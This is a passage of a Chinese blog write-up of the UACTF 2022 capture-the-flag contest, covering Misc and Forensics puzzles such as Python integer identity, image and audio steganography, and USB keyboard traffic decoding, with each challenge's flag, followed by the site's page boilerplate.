+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/4-1-1.png" alt="18"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;b4d_h4b175_l34d_70_py7h0n2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="5-1-Welcome"><a href="#5-1-Welcome" class="headerlink" title="5-1 Welcome"></a><strong>5-1 Welcome</strong></h3><p>签到题目，题目提供了该比赛的 Flag 格式，简单复制粘贴即可。</p>
+<h3 id="5-2-Snake-Equality"><a href="#5-2-Snake-Equality" class="headerlink" title="5-2 Snake Equality"></a><strong>5-2 Snake Equality</strong></h3><p>一道关于 Python 内存地址的题目。题目提供了程序的 python 源码。</p>
+<p>题目要求我们输入一个数字 n 和一个字符 c，并要求经过强制类型转换的整型数字 n 和 经过 ord() 函数解码的 c 生成的数字相同，但是加 1 后不同。</p>
+<p>起初与 jackfromeast 进行了简单的思考，可能都在想 ord() 函数处理字符串的一个边界问题，但是并未成功，于是暂时搁置了。后面注意到它使用的是 “is” 而不是 “==”，经查询发现，“ is ”：是要求两个对象要相同，即同一个对象（相同id）；“==”：只需要值相同即可；因此改题目是对python整型内存id的考察，同样查询发现python针对整型中的0-256，会统一分配相同的id，而大于256就会独立分配id。因此我们需要做的就是在256的边界进行操作，即输入 n = 256， 字符为Unicode中对应十进制数字为256的字符即可。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5NmtIwIgvqppomDYyFEWRw.png" alt="19"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;n07_411_5n4k35_423_8u117_3qu41_45_d3m0n572473d_8y_15_4nd_3qu415&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="5-3-Blurry-Eyed-Aha"><a href="#5-3-Blurry-Eyed-Aha" class="headerlink" title="5-3 Blurry-Eyed [Aha!]"></a><strong>5-3 Blurry-Eyed</strong> <strong>[Aha!]</strong></h3><p>隐写的题目还是多见多总结，没有更好的办法。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-1.png" alt="20"></p>
+<p>原图没有一丝头绪，看到其他师傅的WriteUp说此图是一张3D图片，需要使用<a target="_blank" rel="noopener" href="https://piellardj.github.io/stereogram-solver/">stereogram solver</a>工具来查看。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-2.png" alt="21"></p>
+<h2 id="Forenics"><a href="#Forenics" class="headerlink" title="Forenics"></a><strong>Forenics</strong></h2><h3 id="6-1-Colour-Blind"><a href="#6-1-Colour-Blind" class="headerlink" title="6-1 Colour Blind"></a><strong>6-1 Colour Blind</strong></h3><p>基础的图片隐写题目。题目提供了一个图片。</p>
+<p>简单的使用工具即可，stegSlove 可以进行不同色彩的展示，同时结合题目名称，我们可以发现 Flag。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-1-1.png" alt="22"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;r37urn_0f_7h3_c0l0r_m31573r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="6-2-HID-Table-for-0x2"><a href="#6-2-HID-Table-for-0x2" class="headerlink" title="6-2 HID Table for 0x2"></a><strong>6-2 HID Table for 0x2</strong></h3><p>此题目是USB协议下的Keyboard键盘流量分析。</p>
+<p>首先流量中存在设备1.2.0和设备1.3.0，通过握手信息中DESCRIPTER response device可以得到设备1.3.0为目标键盘，如下所示。所以1.3.1即为键盘通信的目的地址。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-2-1.png" alt="23"></p>
+<p>由于地址不满足ip地址的规范，我们可以使用长度来进行过滤。键盘的按键信息通过中断URB_INTERRUPT来来传输，键的信息存储在Leftover Capture Data的8字节中。其中第一个字节用来表示是否按下shift键，第三个字节表示实际按下的键是什么，通过键盘表的对应可知。所以我们只需要把1.3.1发送的流量中的所有8字节dump下来并取第三字节(第一字节辅助)进行翻译即可。</p>
+<p>值得一提的是，通过以上帖子得到的字符串没有实义，花费了许多时间。后来我发现流量中包含着键盘中的右箭头、左箭头和回车键，分别对应着0x4f,0x50以及0x28，这些键会改变字符串的输入流，所以需要设置一个字符串的指针(光标)来处理。左箭头和后箭头分别对应着左移和右移，回车对应着光标归零。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/NNLFcy8P3GDyx1lMmoUiYg.png" alt="24"></p>
+<p>后半部分为网址，前半部分为网址中应填入的密码。最终获得flag，如下所示。</p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;234d_&#39;3m_4nd_w33p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="6-3-Infinite-Aha"><a href="#6-3-Infinite-Aha" class="headerlink" title="6-3 Infinite [Aha!]"></a><strong>6-3 Infinite [Aha!]</strong></h3><p>ogg 格式的音频隐写也是第一次见，还是用常规方法 Audacity 分析，发现并不太行，看到其他师傅们的方法和讲解。原因在于 ogg 格式文件是由多个迷你的 oggs 容器构成，因此需要将其多个音频流进行分离，并且流媒体可以通过它的 “序列号”（OggS文件签名后的10个字节）来识别。这里可以使用工具 oggz-tools。</p>
+<pre class="line-numbers language-none"><code class="language-none">apt-get install oggz-tools
+oggz rip -i 0 infinite.ogg -o stream0.ogg
+oggz rip -i 1 infinite.ogg -o stream1.ogg
+oggz rip -i 2 infinite.ogg -o stream2.ogg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着使用 audacity 查看生成的 stream1.ogg 和 stream2.ogg 文件的频谱图，分别获得 flag 的部分，进行拼接即可。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/forenics-3.png" alt="25"></p>
+<pre class="line-numbers language-none"><code class="language-none">UACTF&#123;t01nf1n1ty4ndb3y0nd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">美食家李老叭</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://laobameishijia.github.io/2022/08/15/uactf-2022-writeup/">https://laobameishijia.github.io/2022/08/15/uactf-2022-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">美食家李老叭</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tag/%E6%AF%94%E8%B5%9B/">
+                                    <span class="chip bg-color">比赛</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'q5k1wXexowy7MeNN0CrLYpoK-gzGzoHsz',
+        appKey: 'YmFtstASS0GUVRowdQQl4LPb',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/08/15/ascwg-2022-writeup/">
+                    <div class="card-image">
+                        
+                        <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153453.png" class="responsive-img" alt="Arab Security Cyber Wargames 2022">
+                        
+                        <span class="card-title">Arab Security Cyber Wargames 2022</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CTF
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-15
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/category/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tag/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/08/04/ctf-pwn-1/">
+                    <div class="card-image">
+                        
+                        <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220804185659.png" class="responsive-img" alt="CTF-PWN-1">
+                        
+                        <span class="card-title">CTF-PWN-1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CTF-PWN
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/category/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tag/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2025</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">老叭美食家</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">256.3k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "5";
+                        var startDate = "21";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/laobameishijia" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:994291043@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=994291043" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 994291043" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2021, 05, 21, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/scrollprogress/scrollProgress.min.js"></script>
